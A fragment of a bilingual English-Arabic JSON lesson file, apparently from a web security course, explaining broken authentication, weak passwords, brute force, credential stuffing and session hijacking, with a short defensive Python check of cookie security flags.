+          "value": {
+            "en": "Authentication, authorization, and session management form a security triangle. Each one depends on the others to provide complete protection. Authentication verifies your identity at the start. Session management keeps track of your authenticated status as you use the application. Authorization checks your permissions for every action you try to perform. If any one of these three is weak or broken, the entire security model fails. For example, strong authentication is useless if session IDs are easy to steal. Secure sessions mean nothing if authorization does not properly check permissions. Understanding this triangle helps you see why all three must be implemented correctly.",
+            "ar": "تشكل المصادقة والتفويض وإدارة الجلسات مثلث أمان. يعتمد كل واحد على الآخرين لتوفير حماية كاملة. تتحقق المصادقة من هويتك في البداية. تتتبع إدارة الجلسات حالة المصادقة الخاصة بك أثناء استخدام التطبيق. يتحقق التفويض من أذوناتك لكل إجراء تحاول القيام به. إذا كان أي واحد من هؤلاء الثلاثة ضعيفاً أو معطلاً، فإن نموذج الأمان بأكمله يفشل. على سبيل المثال، المصادقة القوية لا فائدة منها إذا كان من السهل سرقة معرفات الجلسة. الجلسات الآمنة لا تعني شيئاً إذا لم يتحقق التفويض بشكل صحيح من الأذونات. فهم هذا المثلث يساعدك على رؤية سبب وجوب تنفيذ الثلاثة جميعاً بشكل صحيح."
+          }
+        },
+        {
+          "id": 21,
+          "type": "list",
+          "title": {
+            "en": "Real-World Examples of the Security Triangle",
+            "ar": "أمثلة واقعية لمثلث الأمان"
+          },
+          "items": {
+            "en": [
+              "Banking application: Strong MFA authentication, sessions expire after 5 minutes of inactivity, authorization checks before every transaction",
+              "E-commerce site: Password login with optional MFA, session persists for shopping but expires on checkout, users cannot view other customers' order history",
+              "Corporate intranet: Single sign-on authentication, sessions last 8 hours during work day, role-based authorization determines access to confidential documents",
+              "Social media platform: Username and password login, long-lived sessions with periodic re-authentication, users can only edit their own posts and profiles"
+            ],
+            "ar": [
+              "تطبيق مصرفي: مصادقة MFA قوية، تنتهي الجلسات بعد 5 دقائق من عدم النشاط، فحوصات التفويض قبل كل معاملة",
+              "موقع تجارة إلكترونية: تسجيل دخول بكلمة مرور مع MFA اختياري، تستمر الجلسة للتسوق ولكن تنتهي عند الدفع، لا يمكن للمستخدمين عرض سجل طلبات العملاء الآخرين",
+              "شبكة إنترانت للشركات: مصادقة تسجيل دخول واحد، تستمر الجلسات 8 ساعات خلال يوم العمل، يحدد التفويض القائم على الأدوار الوصول إلى المستندات السرية",
+              "منصة وسائل التواصل الاجتماعي: تسجيل دخول باسم مستخدم وكلمة مرور، جلسات طويلة الأمد مع إعادة مصادقة دورية، يمكن للمستخدمين فقط تحرير منشوراتهم وملفاتهم الشخصية"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "topic-3",
+      "title": {
+        "en": "Broken Authentication Explained: How Attackers Steal Identities",
+        "ar": "شرح المصادقة المعطلة: كيف يسرق المهاجمون الهويات"
+      },
+      "elements": [
+        {
+          "id": 1,
+          "type": "title",
+          "value": {
+            "en": "What is Broken Authentication and Why It Happens",
+            "ar": "ما هي المصادقة المعطلة ولماذا تحدث"
+          }
+        },
+        {
+          "id": 2,
+          "type": "text",
+          "value": {
+            "en": "Broken authentication refers to any weakness in the way an application verifies user identity. It is not a single vulnerability but a category of problems that all have the same result: an attacker can gain access to user accounts without proper credentials. These flaws occur when developers make mistakes in designing or implementing login systems. Common causes include weak password policies, poor session management, missing account lockout mechanisms, and insecure password recovery processes. Broken authentication is consistently ranked among the most critical web security risks because it directly leads to account takeovers and data breaches.",
+            "ar": "تشير المصادقة المعطلة إلى أي ضعف في الطريقة التي يتحقق بها التطبيق من هوية المستخدم. إنها ليست ثغرة واحدة بل فئة من المشاكل التي لها جميعها نفس النتيجة: يمكن للمهاجم الوصول إلى حسابات المستخدمين دون بيانات اعتماد مناسبة. تحدث هذه العيوب عندما يرتكب المطورون أخطاء في تصميم أو تنفيذ أنظمة تسجيل الدخول. تشمل الأسباب الشائعة سياسات كلمات مرور ضعيفة وإدارة جلسات سيئة وآليات قفل حساب مفقودة وعمليات استرداد كلمة مرور غير آمنة. يتم تصنيف المصادقة المعطلة باستمرار بين أخطر مخاطر أمان الويب لأنها تؤدي مباشرة إلى الاستيلاء على الحسابات واختراقات البيانات."
+          }
+        },
+        {
+          "id": 1772330233965.9028,
+          "type": "image",
+          "srcKey": "",
+          "size": "small",
+          "imageUrl": "https://pub-cb38e65ea6bd411eb827a8641fdcc72d.r2.dev/OWASP%20Top%2010%20-%20Authentication%20%26%20Authorization/broken%20authentication.webp"
+        },
+        {
+          "id": 4,
+          "type": "text",
+          "value": {
+            "en": "The impact of broken authentication is severe. When an attacker gains access to a user account, they inherit all the privileges and data associated with that account. For a regular user account, this might mean access to personal messages, payment information, order history, or private documents. For an administrator account, the attacker can control the entire application, create backdoors, modify data, or launch further attacks against other users. In many cases, attackers use compromised accounts to spread malware, send phishing emails, or conduct fraud. The damage extends beyond the immediate victim to everyone connected to them.",
+            "ar": "تأثير المصادقة المعطلة شديد. عندما يحصل مهاجم على وصول إلى حساب مستخدم، فإنه يرث جميع الامتيازات والبيانات المرتبطة بهذا الحساب. بالنسبة لحساب مستخدم عادي، قد يعني هذا الوصول إلى الرسائل الشخصية أو معلومات الدفع أو سجل الطلبات أو المستندات الخاصة. بالنسبة لحساب مسؤول، يمكن للمهاجم التحكم في التطبيق بأكمله وإنشاء أبواب خلفية وتعديل البيانات أو شن مزيد من الهجمات ضد مستخدمين آخرين. في كثير من الحالات، يستخدم المهاجمون الحسابات المخترقة لنشر البرامج الضارة أو إرسال رسائل بريد إلكتروني تصيدية أو إجراء احتيال. يمتد الضرر إلى ما هو أبعد من الضحية المباشرة ليشمل كل من يتصل بهم."
+          }
+        },
+        {
+          "id": 5,
+          "type": "note",
+          "noteType": "warning",
+          "value": {
+            "en": "A single compromised admin account can lead to total system compromise. Attackers prioritize targeting accounts with elevated privileges because they offer the greatest reward for the least effort.",
+            "ar": "يمكن أن يؤدي حساب مسؤول واحد مخترق إلى اختراق النظام بالكامل. يعطي المهاجمون الأولوية لاستهداف الحسابات ذات الامتيازات المرتفعة لأنها توفر أكبر مكافأة بأقل جهد."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 6,
+          "type": "hr"
+        },
+        {
+          "id": 7,
+          "type": "title",
+          "value": {
+            "en": "Common Authentication Vulnerabilities Exploited by Attackers",
+            "ar": "ثغرات المصادقة الشائعة التي يستغلها المهاجمون"
+          }
+        },
+        {
+          "id": 8,
+          "type": "text",
+          "value": {
+            "en": "One of the most common authentication vulnerabilities is the acceptance of weak passwords. Many applications do not enforce minimum password complexity requirements. Users are allowed to choose passwords like 123456, password, or their own name. These passwords are trivial for attackers to guess or crack using automated tools. Even when password policies exist, they are often poorly designed. For example, requiring a password change every 30 days encourages users to choose predictable patterns like Password1, Password2, Password3. A better approach is to require long passwords with a mix of character types and to check against lists of commonly breached passwords.",
+            "ar": "واحدة من أكثر ثغرات المصادقة شيوعاً هي قبول كلمات المرور الضعيفة. لا تفرض العديد من التطبيقات الحد الأدنى من متطلبات تعقيد كلمة المرور. يُسمح للمستخدمين باختيار كلمات مرور مثل 123456 أو password أو اسمهم الخاص. هذه كلمات المرور تافهة بالنسبة للمهاجمين لتخمينها أو كسرها باستخدام أدوات آلية. حتى عندما توجد سياسات كلمات مرور، فإنها غالباً ما تكون مصممة بشكل سيئ. على سبيل المثال، يشجع طلب تغيير كلمة المرور كل 30 يوماً المستخدمين على اختيار أنماط يمكن التنبؤ بها مثل Password1 و Password2 و Password3. النهج الأفضل هو طلب كلمات مرور طويلة مع مزيج من أنواع الأحرف والتحقق من قوائم كلمات المرور المخترقة بشكل شائع."
+          }
+        },
+        {
+          "id": 9,
+          "type": "text",
+          "value": {
+            "en": "Another critical flaw is the lack of account lockout mechanisms. When an application does not limit login attempts, attackers can try thousands or millions of passwords until they find the correct one. This is called a brute force attack. Modern tools can test hundreds of passwords per second. Without rate limiting or temporary account locks after failed attempts, brute force becomes a practical attack method. Some applications implement lockouts incorrectly by locking accounts permanently after a few failed attempts. This creates a denial of service problem where attackers can lock out legitimate users. The correct approach is to implement temporary lockouts that increase in duration with repeated failures.",
+            "ar": "عيب حاسم آخر هو عدم وجود آليات قفل الحساب. عندما لا يحد التطبيق من محاولات تسجيل الدخول، يمكن للمهاجمين تجربة آلاف أو ملايين كلمات المرور حتى يجدوا الصحيحة. يُسمى هذا هجوم القوة الغاشمة. يمكن للأدوات الحديثة اختبار مئات كلمات المرور في الثانية. بدون تقييد المعدل أو قفل الحساب المؤقت بعد المحاولات الفاشلة، تصبح القوة الغاشمة طريقة هجوم عملية. تطبق بعض التطبيقات عمليات القفل بشكل غير صحيح من خلال قفل الحسابات بشكل دائم بعد محاولات فاشلة قليلة. هذا يخلق مشكلة رفض الخدمة حيث يمكن للمهاجمين قفل المستخدمين الشرعيين. النهج الصحيح هو تنفيذ عمليات قفل مؤقتة تزداد في المدة مع الإخفاقات المتكررة."
+          }
+        },
+        {
+          "id": 10,
+          "type": "text",
+          "value": {
+            "en": "Credential stuffing is a related attack that exploits password reuse. Many users use the same password across multiple websites. When one site is breached and passwords are leaked, attackers collect these credentials and try them on other popular services. If you use the same password for your email, banking, and social media accounts, a breach at any one site puts all your accounts at risk. Attackers use automated tools to test millions of username and password combinations across thousands of websites. Applications can defend against credential stuffing by detecting unusual login patterns, requiring multi-factor authentication, or monitoring for compromised credentials.",
+            "ar": "حشو بيانات الاعتماد هو هجوم ذو صلة يستغل إعادة استخدام كلمة المرور. يستخدم العديد من المستخدمين نفس كلمة المرور عبر مواقع ويب متعددة. عندما يتم اختراق أحد المواقع وتسريب كلمات المرور، يجمع المهاجمون بيانات الاعتماد هذه ويجربونها على خدمات شائعة أخرى. إذا كنت تستخدم نفس كلمة المرور لحسابات البريد الإلكتروني والخدمات المصرفية ووسائل التواصل الاجتماعي، فإن اختراق أي موقع واحد يعرض جميع حساباتك للخطر. يستخدم المهاجمون أدوات آلية لاختبار ملايين مجموعات أسماء المستخدمين وكلمات المرور عبر آلاف المواقع. يمكن للتطبيقات الدفاع ضد حشو بيانات الاعتماد من خلال اكتشاف أنماط تسجيل الدخول غير العادية أو طلب مصادقة متعددة العوامل أو مراقبة بيانات الاعتماد المخترقة."
+          }
+        },
+        {
+          "id": 11,
+          "type": "table",
+          "title": {
+            "en": "Authentication Vulnerabilities and Attack Methods",
+            "ar": "ثغرات المصادقة وطرق الهجوم"
+          },
+          "headers": {
+            "en": [
+              "Vulnerability",
+              "How Attackers Exploit It",
+              "Real Impact"
+            ],
+            "ar": [
+              "الثغرة",
+              "كيف يستغلها المهاجمون",
+              "التأثير الحقيقي"
+            ]
+          },
+          "rows": [
+            {
+              "en": [
+                "Weak Password Policy",
+                "Use automated tools to guess common passwords like 123456 or password",
+                "Immediate account access, especially for non-technical users"
+              ],
+              "ar": [
+                "سياسة كلمة مرور ضعيفة",
+                "استخدام أدوات آلية لتخمين كلمات مرور شائعة مثل 123456 أو password",
+                "وصول فوري للحساب، خاصة للمستخدمين غير التقنيين"
+              ]
+            },
+            {
+              "en": [
+                "No Account Lockout",
+                "Perform brute force attacks trying thousands of passwords per minute",
+                "Any account with a weak password can be cracked in hours or days"
+              ],
+              "ar": [
+                "لا يوجد قفل للحساب",
+                "تنفيذ هجمات القوة الغاشمة لتجربة آلاف كلمات المرور في الدقيقة",
+                "يمكن كسر أي حساب بكلمة مرور ضعيفة في ساعات أو أيام"
+              ]
+            },
+            {
+              "en": [
+                "Password Reuse",
+                "Use leaked credentials from other breaches in credential stuffing attacks",
+                "Mass account compromise across multiple platforms simultaneously"
+              ],
+              "ar": [
+                "إعادة استخدام كلمة المرور",
+                "استخدام بيانات الاعتماد المسربة من اختراقات أخرى في هجمات حشو بيانات الاعتماد",
+                "اختراق جماعي للحسابات عبر منصات متعددة في وقت واحد"
+              ]
+            },
+            {
+              "en": [
+                "Missing MFA",
+                "Bypass authentication with stolen or guessed passwords alone",
+                "Single point of failure - one compromised password equals total access"
+              ],
+              "ar": [
+                "MFA مفقود",
+                "تجاوز المصادقة بكلمات مرور مسروقة أو مخمنة فقط",
+                "نقطة فشل واحدة - كلمة مرور واحدة مخترقة تساوي وصولاً كاملاً"
+              ]
+            }
+          ]
+        },
+        {
+          "id": 12,
+          "type": "note",
+          "noteType": "info",
+          "value": {
+            "en": "Password managers help users create and remember strong, unique passwords for every account. Using a password manager significantly reduces the risk of credential stuffing and brute force attacks.",
+            "ar": "تساعد برامج إدارة كلمات المرور المستخدمين على إنشاء وتذكر كلمات مرور قوية وفريدة لكل حساب. يقلل استخدام مدير كلمات المرور بشكل كبير من خطر حشو بيانات الاعتماد وهجمات القوة الغاشمة."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 13,
+          "type": "hr"
+        },
+        {
+          "id": 14,
+          "type": "title",
+          "value": {
+            "en": "Session Management Failures and Identity Theft",
+            "ar": "إخفاقات إدارة الجلسات وسرقة الهوية"
+          }
+        },
+        {
+          "id": 15,
+          "type": "text",
+          "value": {
+            "en": "Session management failures are another major category of broken authentication. After successful login, many applications fail to properly protect session identifiers. If session IDs are predictable or sequential, attackers can guess valid session IDs and hijack active sessions. For example, if session IDs are simple numbers like 1001, 1002, 1003, an attacker can try nearby numbers to find active sessions. Modern applications should generate session IDs using cryptographically secure random number generators that produce long, unpredictable strings. Session IDs should be at least 128 bits of entropy to make guessing practically impossible.",
+            "ar": "إخفاقات إدارة الجلسات هي فئة رئيسية أخرى من المصادقة المعطلة. بعد تسجيل الدخول الناجح، تفشل العديد من التطبيقات في حماية معرفات الجلسة بشكل صحيح. إذا كانت معرفات الجلسة قابلة للتنبؤ أو متسلسلة، يمكن للمهاجمين تخمين معرفات جلسة صالحة واختطاف جلسات نشطة. على سبيل المثال، إذا كانت معرفات الجلسة أرقاماً بسيطة مثل 1001 و 1002 و 1003، يمكن للمهاجم تجربة أرقام قريبة للعثور على جلسات نشطة. يجب على التطبيقات الحديثة إنشاء معرفات جلسة باستخدام مولدات أرقام عشوائية آمنة من الناحية التشفيرية تنتج سلاسل طويلة لا يمكن التنبؤ بها. يجب أن تكون معرفات الجلسة على الأقل 128 بت من الإنتروبيا لجعل التخمين مستحيلاً عملياً."
+          }
+        },
+        {
+          "id": 16,
+          "type": "text",
+          "value": {
+            "en": "Sessions that never expire create a persistent vulnerability. If a user logs in and the session remains valid indefinitely, an attacker who steals the session ID can use it days or weeks later. This is especially dangerous on shared or public computers where session cookies might be left behind. Proper session management requires both idle timeout and absolute timeout. Idle timeout logs users out after a period of inactivity, such as 15 minutes without any requests. Absolute timeout ends the session after a maximum time regardless of activity, such as 8 hours. Sensitive applications like banking should use shorter timeouts, while less critical applications can allow longer sessions.",
+            "ar": "الجلسات التي لا تنتهي صلاحيتها أبداً تخلق ثغرة دائمة. إذا قام مستخدم بتسجيل الدخول وظلت الجلسة صالحة إلى أجل غير مسمى، يمكن للمهاجم الذي يسرق معرف الجلسة استخدامه بعد أيام أو أسابيع. هذا خطير بشكل خاص على أجهزة الكمبيوتر المشتركة أو العامة حيث قد يتم ترك ملفات تعريف ارتباط الجلسة. تتطلب إدارة الجلسات المناسبة كلاً من مهلة الخمول والمهلة المطلقة. تسجّل مهلة الخمول خروج المستخدمين بعد فترة من عدم النشاط، مثل 15 دقيقة دون أي طلبات. تنهي المهلة المطلقة الجلسة بعد حد أقصى للوقت بغض النظر عن النشاط، مثل 8 ساعات. يجب أن تستخدم التطبيقات الحساسة مثل الخدمات المصرفية مهلات أقصر، بينما يمكن للتطبيقات الأقل أهمية السماح بجلسات أطول."
+          }
+        },
+        {
+          "id": 17,
+          "type": "text",
+          "value": {
+            "en": "Transmitting session IDs over unencrypted connections is a critical mistake. When you connect to a website using HTTP instead of HTTPS, all data including session cookies travels in plain text. Anyone on the same network can intercept this traffic and steal your session ID. This is trivially easy on public Wi-Fi networks found in cafes, airports, and hotels. Attackers use packet sniffing tools to capture unencrypted traffic and extract session cookies. Once they have your session ID, they can impersonate you until the session expires. This attack is called session hijacking. The only defense is to always use HTTPS and to configure session cookies with the Secure flag, which prevents them from being transmitted over HTTP.",
+            "ar": "إرسال معرفات الجلسة عبر اتصالات غير مشفرة خطأ فادح. عندما تتصل بموقع ويب باستخدام HTTP بدلاً من HTTPS، تنتقل جميع البيانات بما في ذلك ملفات تعريف ارتباط الجلسة بنص عادي. يمكن لأي شخص على نفس الشبكة اعتراض هذه الحركة وسرقة معرف الجلسة الخاص بك. هذا سهل بشكل تافه على شبكات Wi-Fi العامة الموجودة في المقاهي والمطارات والفنادق. يستخدم المهاجمون أدوات استنشاق الحزم لالتقاط الحركة غير المشفرة واستخراج ملفات تعريف ارتباط الجلسة. بمجرد حصولهم على معرف الجلسة الخاص بك، يمكنهم انتحال شخصيتك حتى تنتهي الجلسة. يُسمى هذا الهجوم اختطاف الجلسة. الدفاع الوحيد هو استخدام HTTPS دائماً وتكوين ملفات تعريف ارتباط الجلسة بعلامة Secure، والتي تمنع إرسالها عبر HTTP."
+          }
+        },
+        {
+          "id": 18,
+          "type": "orderedList",
+          "title": {
+            "en": "How Session Hijacking Works in Practice",
+            "ar": "كيف يعمل اختطاف الجلسة في الممارسة"
+          },
+          "items": [
+            {
+              "subtitle": {
+                "en": "Victim Logs Into Application",
+                "ar": "الضحية تسجل الدخول إلى التطبيق"
+              },
+              "text": {
+                "en": "A user successfully authenticates to a web application using their username and password. The server creates a session and sends a session ID cookie to the user's browser.",
+                "ar": "ينجح مستخدم في المصادقة على تطبيق ويب باستخدام اسم المستخدم وكلمة المرور. ينشئ الخادم جلسة ويرسل ملف تعريف ارتباط معرف جلسة إلى متصفح المستخدم."
+              },
+              "example": {
+                "en": "Example: User logs into their online banking portal from a coffee shop using public Wi-Fi.",
+                "ar": "مثال: يسجل المستخدم الدخول إلى بوابة الخدمات المصرفية عبر الإنترنت من مقهى باستخدام Wi-Fi عام."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Attacker Monitors Network Traffic",
+                "ar": "المهاجم يراقب حركة الشبكة"
+              },
+              "text": {
+                "en": "An attacker on the same Wi-Fi network uses a packet sniffer tool to capture all network traffic. If the application uses HTTP instead of HTTPS, the session cookie is visible in plain text.",
+                "ar": "يستخدم مهاجم على نفس شبكة Wi-Fi أداة استنشاق حزم لالتقاط جميع حركة الشبكة. إذا كان التطبيق يستخدم HTTP بدلاً من HTTPS، فإن ملف تعريف ارتباط الجلسة مرئي بنص عادي."
+              },
+              "example": {
+                "en": "Example: Attacker runs Wireshark and filters for HTTP cookies containing session identifiers.",
+                "ar": "مثال: يشغل المهاجم Wireshark ويصفّي ملفات تعريف ارتباط HTTP التي تحتوي على معرفات جلسة."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Attacker Extracts Session ID",
+                "ar": "المهاجم يستخرج معرف الجلسة"
+              },
+              "text": {
+                "en": "The attacker locates the session cookie in the captured traffic and copies the session ID value. This ID is the key that allows access to the victim's authenticated session.",
+                "ar": "يحدد المهاجم ملف تعريف ارتباط الجلسة في الحركة الملتقطة وينسخ قيمة معرف الجلسة. هذا المعرف هو المفتاح الذي يسمح بالوصول إلى جلسة الضحية المصادق عليها."
+              },
+              "example": {
+                "en": "Example: Cookie: sessionId=a7b3c9d2e5f8g1h4 is captured and extracted.",
+                "ar": "مثال: Cookie: sessionId=a7b3c9d2e5f8g1h4 يتم التقاطه واستخراجه."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Attacker Replays Session ID",
+                "ar": "المهاجم يعيد تشغيل معرف الجلسة"
+              },
+              "text": {
+                "en": "The attacker configures their own browser to send the stolen session ID with requests to the application. The server accepts this session ID and treats the attacker as the legitimate user.",
+                "ar": "يقوم المهاجم بتكوين متصفحه الخاص لإرسال معرف الجلسة المسروق مع الطلبات إلى التطبيق. يقبل الخادم معرف الجلسة هذا ويعامل المهاجم كمستخدم شرعي."
+              },
+              "example": {
+                "en": "Example: Attacker uses browser developer tools or a proxy to inject the stolen cookie into their requests.",
+                "ar": "مثال: يستخدم المهاجم أدوات تطوير المتصفح أو وكيل لحقن ملف تعريف الارتباط المسروق في طلباتهم."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Attacker Gains Full Access",
+                "ar": "المهاجم يحصل على وصول كامل"
+              },
+              "text": {
+                "en": "The attacker can now view account information, perform transactions, change settings, or take any action the legitimate user could take. This continues until the session expires or the victim logs out.",
+                "ar": "يمكن للمهاجم الآن عرض معلومات الحساب وإجراء المعاملات وتغيير الإعدادات أو اتخاذ أي إجراء يمكن للمستخدم الشرعي اتخاذه. يستمر هذا حتى تنتهي الجلسة أو يسجل الضحية الخروج."
+              },
+              "example": {
+                "en": "Example: Attacker transfers money from the victim's account or views sensitive financial documents.",
+                "ar": "مثال: يحوّل المهاجم الأموال من حساب الضحية أو يشاهد مستندات مالية حساسة."
+              }
+            }
+          ]
+        },
+        {
+          "id": 19,
+          "type": "note",
+          "noteType": "warning",
+          "value": {
+            "en": "Never use sensitive applications like banking or email over public Wi-Fi unless you verify the connection is using HTTPS. Look for the padlock icon in your browser's address bar. Consider using a VPN for additional protection on untrusted networks.",
+            "ar": "لا تستخدم أبداً تطبيقات حساسة مثل الخدمات المصرفية أو البريد الإلكتروني عبر Wi-Fi عام ما لم تتحقق من أن الاتصال يستخدم HTTPS. ابحث عن أيقونة القفل في شريط عناوين متصفحك. فكّر في استخدام VPN لحماية إضافية على الشبكات غير الموثوقة."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 20,
+          "type": "code",
+          "language": "python",
+          "value": "# Example: Checking for secure session cookies in HTTP headers\n# This is what a security tester might look for\n\nimport requests\n\nresponse = requests.get('https://example.com/login')\n\nfor cookie in response.cookies:\n    print(f\"Cookie: {cookie.name}\")\n    print(f\"  Secure flag: {cookie.secure}\")\n    print(f\"  HttpOnly flag: {cookie.has_nonstandard_attr('HttpOnly')}\")\n    print(f\"  SameSite: {cookie.get_nonstandard_attr('SameSite')}\")\n    \n    # Security checks\n    if not cookie.secure:\n        print(\"  WARNING: Cookie missing Secure flag - can be sent over HTTP\")\n    if not cookie.has_nonstandard_attr('HttpOnly'):\n        print(\"  WARNING: Cookie missing HttpOnly flag - accessible to JavaScript\")"
+        }
+      ]
+    },
+    {
+      "id": "topic-4",
+      "title": {
+        "en": "Weak Passwords, Brute Force, and Credential Stuffing Attacks",
+        "ar": "كلمات المرور الضعيفة، القوة الغاشمة، وهجمات حشو بيانات الاعتماد"
+      },
+      "elements": [
+        {
+          "id": 1,
+          "type": "title",
+          "value": {
+            "en": "The Anatomy of Weak Passwords: Why They Are Easy Targets",
+            "ar": "تشريح كلمات المرور الضعيفة: لماذا تُعتبر أهدافاً سهلة"
+          }
+        },
+        {
+          "id": 2,
+          "type": "text",
+          "value": {
+            "en": "A weak password is any password that can be easily guessed, cracked, or found in common password lists. The most dangerous weak passwords are those that appear in what security researchers call password dictionaries. These are massive collections of passwords leaked from previous data breaches or commonly used by people worldwide. Examples include 123456, password, qwerty, admin, welcome, and letmein. Attackers compile these dictionaries by analyzing millions of real passwords from breached databases. When they attack a new target, they first try passwords from these dictionaries because they know many users choose predictable patterns.",
+            "ar": "كلمة المرور الضعيفة هي أي كلمة مرور يمكن تخمينها أو كسرها أو العثور عليها بسهولة في قوائم كلمات المرور الشائعة. أخطر كلمات المرور الضعيفة هي تلك التي تظهر فيما يسميه الباحثون الأمنيون قواميس كلمات المرور. هذه مجموعات ضخمة من كلمات المرور المسربة من اختراقات البيانات السابقة أو المستخدمة بشكل شائع من قبل الأشخاص في جميع أنحاء العالم. تشمل الأمثلة 123456 و password و qwerty و admin و welcome و letmein. يجمع المهاجمون هذه القواميس من خلال تحليل ملايين كلمات المرور الحقيقية من قواعد البيانات المخترقة. عندما يهاجمون هدفاً جديداً، يحاولون أولاً كلمات المرور من هذه القواميس لأنهم يعرفون أن العديد من المستخدمين يختارون أنماطاً يمكن التنبؤ بها."
+          }
+        },
+        {
+          "id": 3,
+          "type": "text",
+          "value": {
+            "en": "Weak passwords also include personal information that can be discovered through social engineering or online research. Many people use their birth date, phone number, pet name, favorite sports team, or family member names as passwords. While these feel personal and easy to remember, they are actually very weak. An attacker who spends 15 minutes reviewing your social media profiles can often guess these passwords. For example, if your profile shows you were born on January 15, 1990, and you love a specific football team, an attacker will try combinations like 011590, Jan1590, TeamName90, and similar variations. This type of targeted guessing is surprisingly effective against users who prioritize memorability over security.",
+            "ar": "تتضمن كلمات المرور الضعيفة أيضاً معلومات شخصية يمكن اكتشافها من خلال الهندسة الاجتماعية أو البحث عبر الإنترنت. يستخدم الكثير من الأشخاص تاريخ ميلادهم أو رقم هاتفهم أو اسم حيوانهم الأليف أو فريقهم الرياضي المفضل أو أسماء أفراد الأسرة ككلمات مرور. بينما تبدو هذه شخصية وسهلة التذكر، فهي في الواقع ضعيفة جداً. يمكن للمهاجم الذي يقضي 15 دقيقة في مراجعة ملفات تعريف وسائل التواصل الاجتماعي الخاصة بك تخمين كلمات المرور هذه غالباً. على سبيل المثال، إذا أظهر ملفك الشخصي أنك ولدت في 15 يناير 1990 وتحب فريق كرة قدم معين، فسيحاول المهاجم تركيبات مثل 011590 و Jan1590 و TeamName90 وأشكال مشابهة. هذا النوع من التخمين الموجه فعال بشكل مدهش ضد المستخدمين الذين يعطون الأولوية للتذكر على الأمان."
+          }
+        },
+        {
+          "id": 1772330251467.7002,
+          "type": "image",
+          "srcKey": "",
+          "size": "small",
+          "imageUrl": "https://pub-cb38e65ea6bd411eb827a8641fdcc72d.r2.dev/OWASP%20Top%2010%20-%20Authentication%20%26%20Authorization/spectrum%20of%20passwords.webp"
+        },
+        {
+          "id": 5,
+          "type": "table",
+          "title": {
+            "en": "Common Weak Password Patterns and Their Risks",
+            "ar": "أنماط كلمات المرور الضعيفة الشائعة ومخاطرها"
+          },
+          "headers": {
+            "en": [
+              "Password Pattern",
+              "Real Examples",
+              "Why It Is Weak",
+              "Time to Crack"
+            ],
+            "ar": [
+              "نمط كلمة المرور",
+              "أمثلة حقيقية",
+              "لماذا هي ضعيفة",
+              "الوقت اللازم للكسر"
+            ]
+          },
+          "rows": [
+            {
+              "en": [
+                "Simple sequences",
+                "123456, abcdef, qwerty",
+                "First entries in password dictionaries",
+                "Instant (milliseconds)"
+              ],
+              "ar": [
+                "تسلسلات بسيطة",
+                "123456، abcdef، qwerty",
+                "أول إدخالات في قواميس كلمات المرور",
+                "فوري (ميلي ثانية)"
+              ]
+            },
+            {
+              "en": [
+                "Common words",
+                "password, welcome, admin",
+                "Tested first in all attacks",
+                "Instant (milliseconds)"
+              ],
+              "ar": [
+                "كلمات شائعة",
+                "password، welcome، admin",
+                "يتم اختبارها أولاً في جميع الهجمات",
+                "فوري (ميلي ثانية)"
+              ]
+            },
+            {
+              "en": [
+                "Personal information",
+                "Sarah1990, Fluffy123",
+                "Can be discovered via social media",
+                "Minutes to hours with research"
+              ],
+              "ar": [
+                "معلومات شخصية",
+                "Sarah1990، Fluffy123",
+                "يمكن اكتشافها عبر وسائل التواصل الاجتماعي",
+                "دقائق إلى ساعات مع البحث"
+              ]
+            },
+            {
+              "en": [
+                "Short passwords",
+                "cat, 1234, abc",
+                "Too few possible combinations",
+                "Seconds to minutes"
+              ],
+              "ar": [
+                "كلمات مرور قصيرة",
+                "cat، 1234، abc",
+                "تركيبات محتملة قليلة جداً",
+                "ثوان إلى دقائق"
+              ]
+            },
+            {
+              "en": [
+                "Dictionary words with numbers",
+                "password1, welcome2024",
+                "Common pattern, easily tested",
+                "Minutes"
+              ],
+              "ar": [
+                "كلمات قاموس مع أرقام",
+                "password1، welcome2024",
+                "نمط شائع، يسهل اختباره",
+                "دقائق"
+              ]
+            }
+          ]
+        },
+        {
+          "id": 6,
+          "type": "note",
+          "noteType": "warning",
+          "value": {
+            "en": "Studies show that the top 25 most common passwords account for access to over 10% of all accounts. Never use passwords from common lists, even if you add a number or symbol at the end.",
+            "ar": "تُظهر الدراسات أن أكثر 25 كلمة مرور شيوعاً تمثل الوصول إلى أكثر من 10% من جميع الحسابات. لا تستخدم أبداً كلمات مرور من القوائم الشائعة، حتى لو أضفت رقماً أو رمزاً في النهاية."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 7,
+          "type": "hr"
+        },
+        {
+          "id": 8,
+          "type": "title",
+          "value": {
+            "en": "Brute Force Attacks: How Attackers Test Every Possible Password",
+            "ar": "هجمات القوة الغاشمة: كيف يختبر المهاجمون كل كلمة مرور ممكنة"
+          }
+        },
+        {
+          "id": 9,
+          "type": "text",
+          "value": {
+            "en": "A brute force attack is a method where an attacker systematically tries every possible password combination until the correct one is found. Think of it like trying every key on a large keyring until one opens the lock. In its purest form, a brute force attack starts with short passwords like a, b, c and progresses through longer combinations like aa, ab, ac, and so on. For a password containing only lowercase letters, there are 26 possibilities for each position. A 4-character password has 26^4 or 456,976 possible combinations. A modern computer can test all of these in seconds. As password length increases, the number of possibilities grows exponentially, making brute force slower but never impossible.",
+            "ar": "هجوم القوة الغاشمة هو طريقة يحاول فيها المهاجم بشكل منهجي كل تركيبة كلمة مرور ممكنة حتى يتم العثور على الصحيحة. فكّر في الأمر مثل تجربة كل مفتاح على حلقة مفاتيح كبيرة حتى يفتح أحدها القفل. في شكله الأنقى، يبدأ هجوم القوة الغاشمة بكلمات مرور قصيرة مثل a و b و c ويتقدم عبر تركيبات أطول مثل aa و ab و ac، وما إلى ذلك. بالنسبة لكلمة مرور تحتوي على أحرف صغيرة فقط، هناك 26 احتمالاً لكل موضع. كلمة مرور من 4 أحرف لديها 26^4 أو 456,976 تركيبة ممكنة. يمكن للكمبيوتر الحديث اختبار كل هذه في ثوان. مع زيادة طول كلمة المرور، ينمو عدد الاحتمالات بشكل أسي، مما يجعل القوة الغاشمة أبطأ ولكن ليس مستحيلاً أبداً."
+          }
+        },
+        {
+          "id": 10,
